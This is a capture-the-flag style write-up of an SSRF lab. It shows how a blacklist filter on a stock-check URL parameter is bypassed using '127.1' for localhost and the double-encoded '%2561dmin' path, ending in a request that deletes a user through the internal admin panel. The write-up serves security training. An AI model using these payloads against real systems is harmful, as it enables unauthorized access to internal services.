## SSRF with blacklist-based input filter

This lab has a stock check feature which fetches data from an internal system.

To solve the lab, change the stock check URL to access the admin interface at http://localhost/admin and delete the user carlos.

The developer has deployed two weak anti-SSRF defenses that you will need to bypass.

## Notes

- /product/stock
- /resources/js/stockCheck.js
- admin panel
- login

## Resume

1. Capture `/product/stock` request
2. Try to access `http://localhost/admin`
3. Update payload with bypass
3. Delete user Carlos

## Solve 

Capture `/product/stock` request :

```
stockApi=http%3A%2F%2Fstock.weliketoshop.net%3A8080%2Fproduct%2Fstock%2Fcheck%3FproductId%3D1%26storeId%3D1
```

Edit the request to try to access `http://localhost/admin` : 

```
stockApi=http%3a%2f%2flocalhost%2fadmin
```

The answer : 

```
"External stock check blocked for security reasons"
```

To bypass, modify **localhost** to : **127.1** and **/admin** with **/%2561dmin** to make the request : 

```
stockApi=http%3a//127.1/%2561dmin
```

The answer : 

```html
                   <section>
                        <h1>Users</h1>
                        <div>
                            <span>wiener - </span>
                            <a href="/admin/delete?username=wiener">Delete</a>
                        </div>
                        <div>
                            <span>carlos - </span>
                            <a href="/admin/delete?username=carlos">Delete</a>
                        </div>
                    </section>
```

Update the request to delete Carlos : 

```
stockApi=http%3a//127.1/%2561dmin/delete?username=carlos
```

This works because the filter blocks the literal string `localhost` and `admin`, but `127.1` is an alternative loopback representation that bypasses the hostname filter, and `%2561` is double-encoded (`a`) which gets decoded server-side, allowing access to `/admin`.